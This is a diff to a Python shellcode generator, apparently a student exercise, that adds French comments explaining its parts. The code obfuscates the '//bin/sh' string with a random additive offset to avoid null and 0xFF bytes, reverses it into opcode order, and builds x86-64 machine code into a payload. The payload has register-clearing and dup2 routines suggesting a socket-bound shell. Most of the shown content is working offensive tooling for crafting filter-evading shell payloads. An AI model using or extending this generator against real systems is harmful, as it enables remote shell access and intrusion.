@@ -4,69 +4,88 @@ from random import randint as r
 import socket
 from sys import argv
 
+
+#Fonction qui va vérifier que la string reçue ne contient aucune valeur hexa 0x00 ou 0xFF
 def verifOffus(binBashHexa):
+    #Parcours la string
     for i in range(0,18,2):
+
+        #Ignore '0x'
         if i == 0 :
                 continue
         
+        #Récupère par tranche de deux caractères une sub string
         sub ="0x"+binBashHexa[i] + binBashHexa[i+1]
         numInHex = int(sub,16)
+
+        #Vérifie qu'il n'y ait ni de 0 ni de valeur à 16
         if numInHex == int("0x00",16) or numInHex == int("0xff",16) :
             return False
     return True
 
 
 def factorOffus(string4Payload):
+    #Vérifie que la string ne contient aucune valeur hexa 0x00 ou 0xFF
     if verifOffus(string4Payload) == False:
         return string4Payload
 
+    #Tableau qui va recevoir les possibilités d'offuscation par addition ou soustraction
     arr = []
+    #On définit l'opérateur (1 == '-' ; 2 == '+')
     ope = r(1,2)
    
-    for i in range(0,18,2):
-        if i == 0 :
-                continue
-        
+    #On parcours la string par tranche de deux caractère pour évaluer les 15 possibilités de soustraction ou d'addition à chaque valeur
+    #récupéré
+    for i in range(2,18,2): #Commence à 2 pour ignorer "0x" dans la chaine
+
+        #Récupère la substring (valeur en hexa) par tranche de 2
         sub ="0x"+string4Payload[i] + string4Payload[i+1]
         numInHex = int(sub,16)
-        #print(sub, numInHex)
 
+        #On vérifie l'addition ou la soustraction à la valeur récupéré de 1 à 15
         for j in range(1,15):
             
-            
+            #Soustraciton
             if ope == 1 :
                 tmp = numInHex - j
-                
+                #Si le résultat de la sosutraction est différente de 255 (0xFF) ou 0 (0x00), on ajoute à la liste
                 if tmp < 255 and tmp > 0:
                     arr.append(j)
                 else:
                     break
-
+            #Addition
             if ope == 2 :
                 tmp = numInHex + j
+                #Si le résultat de l'addition est différente de 255 (0xFF) ou 0 (0x00), on ajoute à la liste
                 if tmp < 255 and tmp > 0:
                     arr.append(j)
                 else:
                     break
 
-    arr[:] = list(set(arr)) #Rend unique chaque valeurs
-    rand = r(arr[0],arr[-1])
+    arr[:] = list(set(arr)) #Rend unique chaque valeurs et les ordonnes 
+    rand = r(arr[0],arr[-1]) #On choisie aléatoirement parmis les valeurs obtenue une seule valeur
 
+    #Si l'opérateur été "-", on rend positif la valeur choisie aléatoirement
     if ope == 1 :
          rand = rand * -1
-    #print(rand)
+
     return rand
 
+#Le "main" de l'offuscation, on va utiliser la valeur alétaoire et l'additionner à toutes les valeur par tanches de deux de la string en hexa
 def offus(string4Payload, rand):
+    #On recinstitue une nouvelle chaine en hexa
     newString = "0x"
 
+    #En ignorant "0x"
     for i in range(2,18,2):
-        if i == 0 :
-                continue
         
+        #Récupère la valeur hexa pour l'occurence en cours
         sub = string4Payload[i] + string4Payload[i+1]
+        #Ajout la valeur random à la valeur (résultat en décimal)
         numInDec = int(sub,16) + rand
+        #Convertit en hexa
         numInHex = hex(numInDec)
+        #numInHex = "0xXX" donc on récupère que la valeur XX
         newString = newString + str(numInHex[-2:])
     
     return newString
@@ -176,13 +195,22 @@ def dup2x3():
 
 def shell():
     global PAYLOAD
+    #String d'accueil offusquée 
     addString = ""
+
+    #Clean les registres
     PAYLOAD+=clean("rax")
     PAYLOAD+=clean("rdx")
 
+    #Obrient le coefficient d'addition ou soustraction
     factorOffusVar = factorOffus("0x68732f6e69622f2f")
+
+    #Offusque la string
     offuString = offus("0x68732f6e69622f2f",factorOffusVar)
-    offuString = offuString[::-1]#Inverse en mirroir tout la chaine pour op code
+
+    #Inverse en mirroir tout la chaine pour op code
+    offuString = offuString[::-1]
+
     PAYLOAD += "48bb"  #mov rbx, ...
     for i in range(0,15,2):
         sub = offuString[i+1] + offuString[i] 
